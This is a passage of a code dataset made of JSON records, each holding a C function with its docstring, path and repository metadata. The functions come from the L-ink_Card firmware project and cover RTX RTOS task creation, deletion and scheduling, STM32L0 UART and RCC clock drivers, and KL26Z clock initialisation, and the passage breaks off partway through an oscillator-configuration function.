{"docstring": "/*--------------------------- rt_init_context -------------------------------*/\n", "func_signal": "static void rt_init_context (P_TCB p_TCB, U8 priority, FUNCP task_body)", "code": "{\n  /* Initialize general part of the Task Control Block. */\n  p_TCB->cb_type = TCB;\n  p_TCB->state   = READY;\n  p_TCB->prio    = priority;\n  p_TCB->p_lnk   = NULL;\n  p_TCB->p_rlnk  = NULL;\n  p_TCB->p_dlnk  = NULL;\n  p_TCB->p_blnk  = NULL;\n  p_TCB->delta_time    = 0;\n  p_TCB->interval_time = 0;\n  p_TCB->events  = 0;\n  p_TCB->waits   = 0;\n  p_TCB->ret_val = OS_R_OK;\n  p_TCB->ret_upd = 0;\n\n  if (p_TCB->priv_stack == 0) {\n    /* Allocate the memory space for the stack. */\n    p_TCB->stack = rt_alloc_box (mp_stk);\n  }\n  rt_init_stack (p_TCB, task_body);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_tsk_delete ---------------------------------*/\n", "func_signal": "OS_RESULT rt_tsk_delete (OS_TID task_id)", "code": "{\n  /* Terminate the task identified with \"task_id\". */\n  P_TCB task_context;\n\n  if (task_id == 0 || task_id == os_tsk.run->task_id) {\n    /* Terminate itself. */\n    os_tsk.run->state     = INACTIVE;\n    os_tsk.run->tsk_stack = rt_get_PSP ();\n    rt_stk_check ();\n    os_active_TCB[os_tsk.run->task_id-1] = NULL;\n    rt_free_box (mp_stk, os_tsk.run->stack);\n    os_tsk.run->stack = NULL;\n    DBG_TASK_NOTIFY(os_tsk.run, __FALSE);\n    rt_free_box (mp_tcb, os_tsk.run);\n    os_tsk.run = NULL;\n    rt_dispatch (NULL);\n    /* The program should never come to this point. */\n  }\n  else {\n    /* Find the task in the \"os_active_TCB\" array. */\n    if (task_id > os_maxtaskrun || os_active_TCB[task_id-1] == NULL) {\n      /* Task with \"task_id\" not found or not started. */\n      return (OS_R_NOK);\n    }\n    task_context = os_active_TCB[task_id-1];\n    rt_rmv_list (task_context);\n    rt_rmv_dly (task_context);\n    os_active_TCB[task_id-1] = NULL;\n    rt_free_box (mp_stk, task_context->stack);\n    task_context->stack = NULL;\n    DBG_TASK_NOTIFY(task_context, __FALSE);\n    rt_free_box (mp_tcb, task_context);\n  }\n  return (OS_R_OK);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief Enable UART Stop Mode.\n  * @note The UART is able to wake up the MCU from Stop 1 mode as long as UART clock is HSI or LSE.\n  * @param huart UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_EnableStopMode(UART_HandleTypeDef *huart)", "code": "{\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  /* Set UESM bit */\n  SET_BIT(huart->Instance->CR1, USART_CR1_UESM);\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "L-ink_Card/Firmware/Clion/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_uart_ex.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/* ----------------------------------------------------------------------------\n   -- SystemCoreClockUpdate()\n   ---------------------------------------------------------------------------- */\n", "func_signal": "void SystemCoreClockUpdate (void)", "code": "{\n  uint32_t MCGOUTClock;                                                        /* Variable to store output clock frequency of the MCG module */\n  uint8_t Divider;\n\n  if ((MCG->C1 & MCG_C1_CLKS_MASK) == 0x0u) {\n    /* Output of FLL or PLL is selected */\n    if ((MCG->C6 & MCG_C6_PLLS_MASK) == 0x0u) {\n      /* FLL is selected */\n      if ((MCG->C1 & MCG_C1_IREFS_MASK) == 0x0u) {\n        /* External reference clock is selected */\n        MCGOUTClock = CPU_XTAL_CLK_HZ;                                       /* System oscillator drives MCG clock */\n        Divider = (uint8_t)(1u << ((MCG->C1 & MCG_C1_FRDIV_MASK) >> MCG_C1_FRDIV_SHIFT));\n        MCGOUTClock = (MCGOUTClock / Divider);  /* Calculate the divided FLL reference clock */\n        if ((MCG->C2 & MCG_C2_RANGE0_MASK) != 0x0u) {\n          MCGOUTClock /= 32u;                                                  /* If high range is enabled, additional 32 divider is active */\n        } /* ((MCG->C2 & MCG_C2_RANGE0_MASK) != 0x0u) */\n      } else { /* (!((MCG->C1 & MCG_C1_IREFS_MASK) == 0x0u)) */\n        MCGOUTClock = CPU_INT_SLOW_CLK_HZ;                                     /* The slow internal reference clock is selected */\n      } /* (!((MCG->C1 & MCG_C1_IREFS_MASK) == 0x0u)) */\n      /* Select correct multiplier to calculate the MCG output clock  */\n      switch (MCG->C4 & (MCG_C4_DMX32_MASK | MCG_C4_DRST_DRS_MASK)) {\n        case 0x0u:\n          MCGOUTClock *= 640u;\n          break;\n        case 0x20u:\n          MCGOUTClock *= 1280u;\n          break;\n        case 0x40u:\n          MCGOUTClock *= 1920u;\n          break;\n        case 0x60u:\n          MCGOUTClock *= 2560u;\n          break;\n        case 0x80u:\n          MCGOUTClock *= 732u;\n          break;\n        case 0xA0u:\n          MCGOUTClock *= 1464u;\n          break;\n        case 0xC0u:\n          MCGOUTClock *= 2197u;\n          break;\n        case 0xE0u:\n          MCGOUTClock *= 2929u;\n          break;\n        default:\n          break;\n      }\n    } else { /* (!((MCG->C6 & MCG_C6_PLLS_MASK) == 0x0u)) */\n      /* PLL is selected */\n      Divider = (1u + (MCG->C5 & MCG_C5_PRDIV0_MASK));\n      MCGOUTClock = (uint32_t)(CPU_XTAL_CLK_HZ / Divider);                     /* Calculate the PLL reference clock */\n      Divider = ((MCG->C6 & MCG_C6_VDIV0_MASK) + 24u);\n      MCGOUTClock *= Divider;                       /* Calculate the MCG output clock */\n    } /* (!((MCG->C6 & MCG_C6_PLLS_MASK) == 0x0u)) */\n  } else if ((MCG->C1 & MCG_C1_CLKS_MASK) == 0x40u) {\n    /* Internal reference clock is selected */\n    if ((MCG->C2 & MCG_C2_IRCS_MASK) == 0x0u) {\n      MCGOUTClock = CPU_INT_SLOW_CLK_HZ;                                       /* Slow internal reference clock selected */\n    } else { /* (!((MCG->C2 & MCG_C2_IRCS_MASK) == 0x0u)) */\n      MCGOUTClock = CPU_INT_FAST_CLK_HZ / (1 << ((MCG->SC & MCG_SC_FCRDIV_MASK) >> MCG_SC_FCRDIV_SHIFT));  /* Fast internal reference clock selected */\n    } /* (!((MCG->C2 & MCG_C2_IRCS_MASK) == 0x0u)) */\n  } else if ((MCG->C1 & MCG_C1_CLKS_MASK) == 0x80u) {\n    /* External reference clock is selected */\n    MCGOUTClock = CPU_XTAL_CLK_HZ;                                           /* System oscillator drives MCG clock */\n  } else { /* (!((MCG->C1 & MCG_C1_CLKS_MASK) == 0x80u)) */\n    /* Reserved value */\n    return;\n  } /* (!((MCG->C1 & MCG_C1_CLKS_MASK) == 0x80u)) */\n  SystemCoreClock = (MCGOUTClock / (1u + ((SIM->CLKDIV1 & SIM_CLKDIV1_OUTDIV1_MASK) >> SIM_CLKDIV1_OUTDIV1_SHIFT)));\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/hic_hal/freescale/kl26z/MKL26Z4/system_MKL26Z4.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief  Disable UART Clock when in Stop Mode.\n  * @param  huart UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_DisableClockStopMode(UART_HandleTypeDef *huart)", "code": "{\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  /* Clear UCESM bit */\n  CLEAR_BIT(huart->Instance->CR3, USART_CR3_UCESM);\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "L-ink_Card/Firmware/Clion/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_uart_ex.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_tsk_prio -----------------------------------*/\n", "func_signal": "OS_RESULT rt_tsk_prio (OS_TID task_id, U8 new_prio)", "code": "{\n  /* Change execution priority of a task to \"new_prio\". */\n  P_TCB p_task;\n\n  if (task_id == 0) {\n    /* Change execution priority of calling task. */\n    os_tsk.run->prio = new_prio;\nrun:if (rt_rdy_prio() > new_prio) {\n      rt_put_prio (&os_rdy, os_tsk.run);\n      os_tsk.run->state   = READY;\n      os_tsk.run->ret_val = OS_R_OK;\n      rt_dispatch (NULL);\n    }\n    return (OS_R_OK);\n  }\n\n  /* Find the task in the \"os_active_TCB\" array. */\n  if (task_id > os_maxtaskrun || os_active_TCB[task_id-1] == NULL) {\n    /* Task with \"task_id\" not found or not started. */\n    return (OS_R_NOK);\n  }\n  p_task = os_active_TCB[task_id-1];\n  p_task->prio = new_prio;\n  if (p_task == os_tsk.run) {\n    goto run;\n  }\n  rt_resort_prio (p_task);\n  if (p_task->state == READY) {\n    /* Task enqueued in a ready list. */\n    p_task = rt_get_first (&os_rdy);\n    os_tsk.run->ret_val = OS_R_OK;\n    rt_dispatch (p_task);\n  }\n  return (OS_R_OK);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief  Configures the RCC_OscInitStruct according to the internal\n  * RCC configuration registers.\n  * @param  RCC_OscInitStruct pointer to an RCC_OscInitTypeDef structure that\n  * will be configured.\n  * @retval None\n  */\n", "func_signal": "void HAL_RCC_GetOscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)", "code": "{\n  /* Check the parameters */\n  assert_param(RCC_OscInitStruct != (void *)NULL);\n\n  /* Set all possible values for the Oscillator type parameter ---------------*/\n  RCC_OscInitStruct->OscillatorType = RCC_OSCILLATORTYPE_HSE | RCC_OSCILLATORTYPE_HSI  \\\n                  | RCC_OSCILLATORTYPE_LSE | RCC_OSCILLATORTYPE_LSI | RCC_OSCILLATORTYPE_MSI;\n#if defined(RCC_HSI48_SUPPORT)\n  RCC_OscInitStruct->OscillatorType |= RCC_OSCILLATORTYPE_HSI48;\n#endif /* RCC_HSI48_SUPPORT */\n\n\n  /* Get the HSE configuration -----------------------------------------------*/\n  if((RCC->CR &RCC_CR_HSEBYP) == RCC_CR_HSEBYP)\n  {\n    RCC_OscInitStruct->HSEState = RCC_HSE_BYPASS;\n  }\n  else if((RCC->CR &RCC_CR_HSEON) == RCC_CR_HSEON)\n  {\n    RCC_OscInitStruct->HSEState = RCC_HSE_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->HSEState = RCC_HSE_OFF;\n  }\n\n  /* Get the HSI configuration -----------------------------------------------*/\n  if((RCC->CR &RCC_CR_HSION) == RCC_CR_HSION)\n  {\n    RCC_OscInitStruct->HSIState = RCC_HSI_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->HSIState = RCC_HSI_OFF;\n  }\n\n  RCC_OscInitStruct->HSICalibrationValue = (uint32_t)((RCC->ICSCR & RCC_ICSCR_HSITRIM) >> 8);\n\n  /* Get the MSI configuration -----------------------------------------------*/\n  if((RCC->CR &RCC_CR_MSION) == RCC_CR_MSION)\n  {\n    RCC_OscInitStruct->MSIState = RCC_MSI_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->MSIState = RCC_MSI_OFF;\n  }\n\n  RCC_OscInitStruct->MSICalibrationValue = (uint32_t)((RCC->ICSCR & RCC_ICSCR_MSITRIM) >> RCC_ICSCR_MSITRIM_Pos);\n  RCC_OscInitStruct->MSIClockRange = (uint32_t)((RCC->ICSCR & RCC_ICSCR_MSIRANGE));\n\n  /* Get the LSE configuration -----------------------------------------------*/\n  if((RCC->CSR &RCC_CSR_LSEBYP) == RCC_CSR_LSEBYP)\n  {\n    RCC_OscInitStruct->LSEState = RCC_LSE_BYPASS;\n  }\n  else if((RCC->CSR &RCC_CSR_LSEON) == RCC_CSR_LSEON)\n  {\n    RCC_OscInitStruct->LSEState = RCC_LSE_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->LSEState = RCC_LSE_OFF;\n  }\n\n  /* Get the LSI configuration -----------------------------------------------*/\n  if((RCC->CSR &RCC_CSR_LSION) == RCC_CSR_LSION)\n  {\n    RCC_OscInitStruct->LSIState = RCC_LSI_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->LSIState = RCC_LSI_OFF;\n  }\n\n#if defined(RCC_HSI48_SUPPORT)\n  /* Get the HSI48 configuration if any-----------------------------------------*/\n  RCC_OscInitStruct->HSI48State = __HAL_RCC_GET_HSI48_STATE();\n#endif /* RCC_HSI48_SUPPORT */\n\n  /* Get the PLL configuration -----------------------------------------------*/\n  if((RCC->CR &RCC_CR_PLLON) == RCC_CR_PLLON)\n  {\n    RCC_OscInitStruct->PLL.PLLState = RCC_PLL_ON;\n  }\n  else\n  {\n    RCC_OscInitStruct->PLL.PLLState = RCC_PLL_OFF;\n  }\n  RCC_OscInitStruct->PLL.PLLSource = (uint32_t)(RCC->CFGR & RCC_CFGR_PLLSRC);\n  RCC_OscInitStruct->PLL.PLLMUL = (uint32_t)(RCC->CFGR & RCC_CFGR_PLLMUL);\n  RCC_OscInitStruct->PLL.PLLDIV = (uint32_t)(RCC->CFGR & RCC_CFGR_PLLDIV);\n}", "path": "L-ink_Card/Firmware/Keil/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_rcc.c", "commit_date": "2020-06-22 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_block --------------------------------------*/\n", "func_signal": "void rt_block (U16 timeout, U8 block_state)", "code": "{\n  /* Block running task and choose next ready task.                         */\n  /* \"timeout\" sets a time-out value or is 0xffff (=no time-out).           */\n  /* \"block_state\" defines the appropriate task state */\n  P_TCB next_TCB;\n\n  if (timeout) {\n    if (timeout < 0xffff) {\n      rt_put_dly (os_tsk.run, timeout);\n    }\n    os_tsk.run->state = block_state;\n    next_TCB = rt_get_first (&os_rdy);\n    rt_switch_req (next_TCB);\n  }\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_switch_req ---------------------------------*/\n", "func_signal": "void rt_switch_req (P_TCB p_new)", "code": "{\n  /* Switch to next task (identified by \"p_new\"). */\n  os_tsk.new   = p_new;\n  p_new->state = RUNNING;\n  DBG_TASK_SWITCH(p_new->task_id);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief By default in multiprocessor mode, when the wake up method is set\n  *        to address mark, the UART handles only 4-bit long addresses detection;\n  *        this API allows to enable longer addresses detection (6-, 7- or 8-bit\n  *        long).\n  * @note  Addresses detection lengths are: 6-bit address detection in 7-bit data mode,\n  *        7-bit address detection in 8-bit data mode, 8-bit address detection in 9-bit data mode.\n  * @param huart         UART handle.\n  * @param AddressLength This parameter can be one of the following values:\n  *          @arg @ref UART_ADDRESS_DETECT_4B 4-bit long address\n  *          @arg @ref UART_ADDRESS_DETECT_7B 6-, 7- or 8-bit long address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_MultiProcessorEx_AddressLength_Set(UART_HandleTypeDef *huart, uint32_t AddressLength)", "code": "{\n  /* Check the UART handle allocation */\n  if (huart == NULL)\n  {\n    return HAL_ERROR;\n  }\n\n  /* Check the address length parameter */\n  assert_param(IS_UART_ADDRESSLENGTH_DETECT(AddressLength));\n\n  huart->gState = HAL_UART_STATE_BUSY;\n\n  /* Disable the Peripheral */\n  __HAL_UART_DISABLE(huart);\n\n  /* Set the address length */\n  MODIFY_REG(huart->Instance->CR2, USART_CR2_ADDM7, AddressLength);\n\n  /* Enable the Peripheral */\n  __HAL_UART_ENABLE(huart);\n\n  /* TEACK and/or REACK to check before moving huart->gState to Ready */\n  return (UART_CheckIdleState(huart));\n}", "path": "L-ink_Card/Firmware/Clion/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_uart_ex.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/* ----------------------------------------------------------------------------\n   -- SystemInit()\n   ---------------------------------------------------------------------------- */\n", "func_signal": "void SystemInit (void)", "code": "{\n#if (DISABLE_WDOG)\n  /* Disable the WDOG module */\n  /* SIM_COPC: COPT=0,COPCLKS=0,COPW=0 */\n  SIM->COPC = (uint32_t)0x00u;\n#endif /* (DISABLE_WDOG) */\n#if (CLOCK_SETUP == 0)\n  SIM->CLKDIV1 = (uint32_t)0x00020000UL; /* Update system prescalers */\n  /* Switch to FEI Mode */\n  /* MCG->C1: CLKS=0,FRDIV=0,IREFS=1,IRCLKEN=1,IREFSTEN=0 */\n  MCG->C1 = (uint8_t)0x06U;\n  MCG->C2 = (uint8_t)0x00U;\n  /* MCG->C4: DMX32=0,DRST_DRS=1 */\n  MCG->C4 = (uint8_t)((MCG->C4 & (uint8_t)~(uint8_t)0xC0U) | (uint8_t)0x20U);\n  OSC0->CR = (uint8_t)0x80U;\n  MCG->C5 = (uint8_t)0x00U;\n  /* MCG->C6: LOLIE0=0,PLLS=0,CME0=0,VDIV0=0 */\n  MCG->C6 = (uint8_t)0x00U;\n  while((MCG->S & MCG_S_IREFST_MASK) == 0x00U) { /* Check that the source of the FLL reference clock is the internal reference clock. */\n  }\n  while((MCG->S & 0x0CU) != 0x00U) {    /* Wait until output of the FLL is selected */\n  }\n#elif (CLOCK_SETUP == 1)\n  /* SIM->SCGC5: PORTA=1 */\n  SIM->SCGC5 |= (uint32_t)0x0200UL;     /* Enable clock gate for ports to enable pin routing */\n  SIM->CLKDIV1 = (uint32_t)0x10010000UL; /* Update system prescalers */\n  /* PORTA->PCR18: ISF=0,MUX=0 */\n  PORTA->PCR[18] &= (uint32_t)~0x01000700UL;\n  /* PORTA->PCR19: ISF=0,MUX=0 */\n  PORTA->PCR[19] &= (uint32_t)~0x01000700UL;\n  /* Switch to FBE Mode */\n  OSC0->CR = (uint8_t)0x80U; // was 0x89U for 8Mhz\n  MCG->C2 = (uint8_t)0x24U;\n  /* MCG->C1: CLKS=2,FRDIV=3,IREFS=0,IRCLKEN=1,IREFSTEN=0 */\n  MCG->C1 = (uint8_t)0xA2U; //was 0x9AU; for 8Mhz\n  /* MCG->C4: DMX32=0,DRST_DRS=0 */\n  MCG->C4 &= (uint8_t)~(uint8_t)0xE0U;\n  MCG->C5 = (uint8_t)0x03U; //was 0x01U; for 8Mhz \n  /* MCG->C6: LOLIE0=0,PLLS=0,CME0=0,VDIV0=0 */\n  MCG->C6 = (uint8_t)0x00U;\n  while((MCG->S & MCG_S_IREFST_MASK) != 0x00U) { /* Check that the source of the FLL reference clock is the external reference clock. */\n  }\n  while((MCG->S & 0x0CU) != 0x08U) {    /* Wait until external reference clock is selected as MCG output */\n  }\n  /* Switch to PBE Mode */\n  /* MCG->C6: LOLIE0=0,PLLS=1,CME0=0,VDIV0=0 */\n  MCG->C6 = (uint8_t)0x40U;\n  while((MCG->S & 0x0CU) != 0x08U) {    /* Wait until external reference clock is selected as MCG output */\n  }\n  while((MCG->S & MCG_S_LOCK0_MASK) == 0x00U) { /* Wait until locked */\n  }\n  /* Switch to PEE Mode */\n  /* MCG->C1: CLKS=0,FRDIV=3,IREFS=0,IRCLKEN=1,IREFSTEN=0 */\n  MCG->C1 = (uint8_t)0x1AU;\n  while((MCG->S & 0x0CU) != 0x0CU) {    /* Wait until output of the PLL is selected */\n  }\n#elif (CLOCK_SETUP == 2)\n  /* SIM->SCGC5: PORTA=1 */\n  SIM->SCGC5 |= (uint32_t)0x0200UL;     /* Enable clock gate for ports to enable pin routing */\n  SIM->CLKDIV1 = (uint32_t)0x00000000UL; /* Update system prescalers */\n  /* PORTA->PCR18: ISF=0,MUX=0 */\n  PORTA->PCR[18] &= (uint32_t)~0x01000700UL;\n  /* PORTA->PCR19: ISF=0,MUX=0 */\n  PORTA->PCR[19] &= (uint32_t)~0x01000700UL;\n  /* Switch to FBE Mode */\n  OSC0->CR = (uint8_t)0x89U;\n  MCG->C2 = (uint8_t)0x24U;\n  /* MCG->C1: CLKS=2,FRDIV=3,IREFS=0,IRCLKEN=1,IREFSTEN=0 */\n  MCG->C1 = (uint8_t)0x9AU;\n  /* MCG->C4: DMX32=0,DRST_DRS=0 */\n  MCG->C4 &= (uint8_t)~(uint8_t)0xE0U;\n  MCG->C5 = (uint8_t)0x00U;\n  /* MCG->C6: LOLIE0=0,PLLS=0,CME0=0,VDIV0=0 */\n  MCG->C6 = (uint8_t)0x00U;\n  while((MCG->S & MCG_S_IREFST_MASK) != 0x00U) { /* Check that the source of the FLL reference clock is the external reference clock. */\n  }\n  while((MCG->S & 0x0CU) != 0x08U) {    /* Wait until external reference clock is selected as MCG output */\n  }\n  /* Switch to BLPE Mode */\n  MCG->C2 = (uint8_t)0x26U;\n  while((MCG->S & 0x0CU) != 0x08U) {    /* Wait until external reference clock is selected as MCG output */\n  }\n#endif /* (CLOCK_SETUP == 2) */\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/hic_hal/freescale/kl26z/MKL26Z4/system_MKL26Z4.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_tsk_create ---------------------------------*/\n", "func_signal": "OS_TID rt_tsk_create (FUNCP task, U32 prio_stksz, void *stk, void *argv)", "code": "{\n  /* Start a new task declared with \"task\". */\n  P_TCB task_context;\n  U32 i;\n\n  /* Priority 0 is reserved for idle task! */\n  if ((prio_stksz & 0xFF) == 0) {\n    prio_stksz += 1;\n  }\n  task_context = rt_alloc_box (mp_tcb);\n  if (task_context == NULL) {\n    return (0);\n  }\n  /* If \"size != 0\" use a private user provided stack. */\n  task_context->stack      = stk;\n  task_context->priv_stack = prio_stksz >> 8;\n  /* Pass parameter 'argv' to 'rt_init_context' */\n  task_context->msg = argv;\n  /* For 'size == 0' system allocates the user stack from the memory pool. */\n  rt_init_context (task_context, prio_stksz & 0xFF, task);\n\n  /* Find a free entry in 'os_active_TCB' table. */\n  i = rt_get_TID ();\n  os_active_TCB[i-1] = task_context;\n  task_context->task_id = i;\n  DBG_TASK_NOTIFY(task_context, __TRUE);\n  rt_dispatch (task_context);\n  os_tsk.run->ret_val = i;\n  return ((OS_TID)i);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief  Initializes the RCC Oscillators according to the specified parameters in the\n  *         RCC_OscInitTypeDef.\n  * @param  RCC_OscInitStruct pointer to an RCC_OscInitTypeDef structure that\n  *         contains the configuration information for the RCC Oscillators.\n  * @note   The PLL is not disabled when used as system clock.\n  * @note   Transitions LSE Bypass to LSE On and LSE On to LSE Bypass are not\n  *         supported by this macro. User should request a transition to LSE Off\n  *         first and then LSE On or LSE Bypass.\n  * @note   Transition HSE Bypass to HSE On and HSE On to HSE Bypass are not\n  *         supported by this macro. User should request a transition to HSE Off\n  *         first and then HSE On or HSE Bypass.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)", "code": "{\n  uint32_t tickstart;\n  uint32_t hsi_state;\n  HAL_StatusTypeDef status;\n  uint32_t sysclk_source, pll_config;\n\n  /* Check the parameters */\n  if(RCC_OscInitStruct == NULL)\n  {\n    return HAL_ERROR;\n  }\n\n  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));\n\n  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();\n  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();\n\n  /*------------------------------- HSE Configuration ------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)\n  {\n    /* Check the parameters */\n    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));\n\n    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */\n    if((sysclk_source == RCC_SYSCLKSOURCE_STATUS_HSE)\n       || ((sysclk_source == RCC_SYSCLKSOURCE_STATUS_PLLCLK) && (pll_config == RCC_PLLSOURCE_HSE)))\n    {\n      if((__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))\n      {\n        return HAL_ERROR;\n      }\n    }\n    else\n    {\n      /* Set the new HSE configuration ---------------------------------------*/\n      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);\n\n      /* Check the HSE State */\n      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)\n      {\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSE is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) == 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > HSE_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n      else\n      {\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSE is disabled */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) != 0U)\n        {\n           if((HAL_GetTick() - tickstart ) > HSE_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n    }\n  }\n  /*----------------------------- HSI Configuration --------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)\n  {\n    /* Check the parameters */\n    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));\n    assert_param(IS_RCC_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));\n\n    hsi_state = RCC_OscInitStruct->HSIState;\n\n#if defined(RCC_CR_HSIOUTEN)\n    if((hsi_state & RCC_HSI_OUTEN) != 0U)\n    {\n      /* HSI Output enable for timer requested */\n      SET_BIT(RCC->CR, RCC_CR_HSIOUTEN);\n\n      hsi_state &= ~RCC_CR_HSIOUTEN;\n    }\n#endif\n\n    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */\n    if((sysclk_source == RCC_SYSCLKSOURCE_STATUS_HSI)\n       || ((sysclk_source == RCC_SYSCLKSOURCE_STATUS_PLLCLK) && (pll_config == RCC_PLLSOURCE_HSI)))\n    {\n      /* When HSI is used as system clock it will not disabled */\n      if((__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) != 0U) && (hsi_state == RCC_HSI_OFF))\n      {\n        return HAL_ERROR;\n      }\n      /* Otherwise, just the calibration and HSI or HSIdiv4 are allowed */\n      else\n      {\n        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/\n        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);\n\n        /* Enable the Internal High Speed oscillator (HSI or HSIdiv4) */\n        __HAL_RCC_HSI_CONFIG(hsi_state);\n      }\n\n      /* Update the SystemCoreClock global variable */\n      SystemCoreClock = HAL_RCC_GetSysClockFreq() >> AHBPrescTable[(RCC->CFGR & RCC_CFGR_HPRE)>> RCC_CFGR_HPRE_Pos];\n\n      /* Configure the source of time base considering new system clocks settings*/\n      status = HAL_InitTick (TICK_INT_PRIORITY);\n      if(status != HAL_OK)\n      {\n        return status;\n      }\n    }\n    else\n    {\n      /* Check the HSI State */\n      if(hsi_state != RCC_HSI_OFF)\n      {\n        /* Enable the Internal High Speed oscillator (HSI or HSIdiv4) */\n        __HAL_RCC_HSI_CONFIG(hsi_state);\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSI is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) == 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > HSI_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n\n        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/\n        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);\n      }\n      else\n      {\n        /* Disable the Internal High Speed oscillator (HSI). */\n        __HAL_RCC_HSI_DISABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSI is disabled */\n        